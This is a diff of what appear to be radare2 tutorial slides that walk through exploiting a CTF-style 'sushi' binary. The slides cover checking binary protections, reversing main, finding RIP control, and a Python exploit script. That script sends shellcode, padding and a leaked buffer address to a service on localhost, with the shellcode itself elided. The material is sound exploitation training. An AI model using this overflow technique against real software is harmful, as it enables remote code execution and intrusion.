@@ -213,10 +213,11 @@ Welcome to radare2!
 
 ```nasm
 $ r2 ./sushi-a6cbcb6...98cb4f98c8
+[0x004004a0]> i~canary
 [0x004004a0]> i~format
 [0x004004a0]> i~nx
 [0x004004a0]> i~pic
-[0x004004a0]> i~canary
+[0x004004a0]> i~relro
 ```
 
 ---
@@ -245,7 +246,16 @@ What is the main function doing?
 
 ---
 
-# The main function
+# Reversing (ex.)
+
+```nasm
+[0x004004a0]> aa
+[0x004004a0]> pdf
+[0x004004a0]> s main
+[0x004004a0]> pdf
+```
+
+What is the main function doing?
 
 ```c
 int main(int argc, char** argv) {
@@ -264,7 +274,7 @@ int main(int argc, char** argv) {
 
 # Getting RIP control (ex.)
 
-```
+```nasm
 $ ragg2 -P 128 -r
 $ r2 -d ./sushi-a6cbc...8cb4f98c8
 [0x7fd1f7ebc090]> dc
@@ -279,15 +289,15 @@ $ r2 -d ./sushi-a6cbc...8cb4f98c8
 # Writing an exploit (ex.)
 
 Our payload will look like this:
-```
+
+```python
 shellcode | ‘A’* (72 - len(shellcode)) | buffer_addr
 ```
-```
+```python
 $ ragg2 -z -i exec
 ```
 
 Can you build a working exploit?
-Writeup in `MIN(~15 minutes, first shell)`
 
 ---
 
@@ -301,10 +311,12 @@ def rop(*args):  # 'Q' and not 'I' for x64
 
 shellcode = "\x31...\x05"
 s = socket.create_connection(('127.0.0.1', 4444))
-buffer_addr = re.search('^Deposit money for sushi   here: (.+)$', s.recv(1024)).group(1)
+buffer_addr = re.search('^Deposit money for sushi   here: (.+)$',
+    s.recv(1024)).group(1)
 buffer_addr = int(buffer_addr, 16)
 
-s.send(shellcode + 'A'*(72 - len(shellcode)) + rop(buffer_addr) + '\n')
+s.send(shellcode + 'A'*(72 - len(shellcode)) +
+    rop(buffer_addr) + '\n')
 s.recv(1024)
 
 while(True):
@@ -324,7 +336,8 @@ while(True):
 
 # Simili-strace (ex.)
 
-- How to open the binary in `d`debug mode?
+- How to tell the debugger that we're dealing with x86_64?
+- How to open the binary in `d`ebug mode?
 - How to trace syscalls à la `strace`?
 
 ---
